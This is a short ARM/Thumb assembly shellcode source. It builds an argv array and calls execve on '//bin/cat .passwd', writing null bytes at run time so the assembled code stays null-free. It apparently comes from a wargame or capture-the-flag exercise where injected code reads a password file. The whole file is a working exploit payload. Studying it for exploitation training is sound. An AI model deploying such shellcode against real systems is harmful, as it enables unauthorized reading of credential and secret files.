.code 32
# thumb-mode
add	r6, pc, #1
bx	r6

.code 16
mov	r0, pc
#r0 -> "//bin/cat"
add	r0, #28

# r2 = 0
sub	r2, r2, r2

#r3 -> '_' (//bin/cat_)
mov	r3, r0
add	r3, r3, #0x9
# replace '_' with '\0'
strb	r2, [r3]

#r3 -> '_' (.passwd_)
add	r3, r3, #9
# replace '_' with '\0'
strb	r2, [r3]

# argv = [ "//bin/cat", ".passwd", NULL]
push	{r2}
#r3 -> ".passwd"
mov	r3, r0
add	r3, r3, #11
push	{r3}
push	{r0}
mov	r1, sp

# execve
mov	r7, #11
svc	1

.ascii	"//bin/cat_#.passwd_#"
